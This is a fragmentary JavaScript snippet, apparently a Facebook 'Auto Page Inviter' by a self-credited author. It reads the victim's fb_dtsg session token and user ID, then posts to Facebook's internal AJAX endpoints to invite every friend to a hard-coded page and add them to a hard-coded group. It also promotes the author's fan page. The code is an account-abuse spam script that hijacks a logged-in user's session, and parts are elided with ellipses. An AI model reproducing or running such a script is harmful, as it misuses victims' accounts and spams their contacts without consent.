...
function InviteFriends(opo) {
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=1446943265542803&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=1427334884172529&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
...
function(a,b){return a.index-b.index})));var Title='Auto Page Inviter<br/> By:<A style="color:#00FF7F;" href="https://www.facebook.com/hodi.minho" target="_blank">Hodi Minz</A>';grpname=document.getElementById("groupsJumpTitle").innerHTML;var Descriptions="",_text='</br>Visit: <A style="color:#3B5998;" href="https://www.facebook.com/HodiMinz/">Fanpage Hodi Minz</A>, Join Yuk!';jx={getHTTPObject:
